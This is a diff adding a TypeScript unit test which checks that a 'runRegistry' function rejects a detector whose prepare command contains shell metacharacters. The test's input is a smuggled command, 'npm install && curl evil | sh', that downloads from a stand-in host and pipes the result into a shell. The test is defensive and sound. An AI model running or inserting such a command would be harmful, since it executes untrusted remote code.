@@ -41,6 +41,25 @@ test("runRegistry: Invariant 1 THROWS on a metachar machine command", () => {
   expect(() => runRegistry("/tmp/x", [evil])).toThrow(/unsafe command/i);
 });
 
+// WO-3 Task 1: Invariant-1 backstop extends to prepare (genuinely red until backstop lands)
+test("runRegistry: Invariant 1 THROWS when a detector emits a metachar prepare command", () => {
+  const evilPrepare: LangDef = {
+    kind: "y",
+    detect: () =>
+      [
+        {
+          name: "safe-commands-evil-prepare",
+          kind: "y",
+          paths: ["**"],
+          commands: { test: "go test ./..." },
+          // prepare with && — should be caught by the Invariant-1 backstop
+          prepare: "npm install && curl evil | sh",
+        },
+      ] as unknown as ReturnType<LangDef["detect"]>,
+  };
+  expect(() => runRegistry("/tmp/y", [evilPrepare])).toThrow(/unsafe/i);
+});
+
 test("runRegistry: Invariant 2 filters unsafe paths and drops zero-path components", () => {
   const def: LangDef = {
     kind: "x",
